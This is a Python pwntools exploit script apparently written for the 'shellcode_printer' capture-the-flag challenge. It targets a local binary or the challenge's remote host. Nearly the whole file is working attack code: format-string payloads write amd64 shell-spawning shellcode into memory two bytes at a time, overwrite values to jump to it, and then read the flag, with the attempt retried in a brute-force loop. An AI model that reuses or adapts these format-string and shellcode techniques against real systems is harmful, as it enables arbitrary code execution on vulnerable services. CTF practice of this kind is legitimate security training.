from pwn import *
from pwnlib import timeout

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./shellcode_printer"
elf = ELF(vuln_path)
libc = elf.libc


def ddebug(io, b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


shellcode = asm(shellcraft.amd64.linux.sh())
log.success(len(shellcode))  # 48
log.hexdump(shellcode)


def pwn(io):
    payload = b"%50115c%6$hn"
    io.sendlineafter("string:", payload)
    for i in range(0, len(shellcode), 2):
        chunk = shellcode[i:i+2]

        int_value1 = int.from_bytes(chunk, 'little')
        log.success(hex(int_value1))
        payload = b"%" + str(int_value1).encode() + b"c%6$hn"
        io.sendlineafter("string: ", payload)
        sleep(0.1)

    payload = b"%*13$d%13$hn"
    io.sendlineafter("string: ", payload)
    sleep(0.1)

    ddebug(io, "breakrva 0x01460\n breakrva 0x0143a\n continue")

    payload = b"%24c%13$hhn"
    io.sendlineafter("string: ", payload)
    sleep(0.1)

    payload = b"%2c%33$hhn"
    io.sendlineafter("string: ", payload)
    sleep(0.1)

    payload = b"\n"
    io.sendlineafter("string: ", payload)

    sleep(2)
    # io.interactive()

    io.sendline(b"cat flag.txt")
    data = io.recv(64, timeout=1)
    if b"{" in data:
        pause()


def getio():
    io = process([vuln_path]) if not f_remote else remote(
        "shellcode-printer.nc.jctf.pro", 1337)
    return io


for i in range(0x300):
    io = None
    try:
        io = getio()
        pwn(io)
    except Exception as e:
        pass
    finally:
        if io:
            io.close()
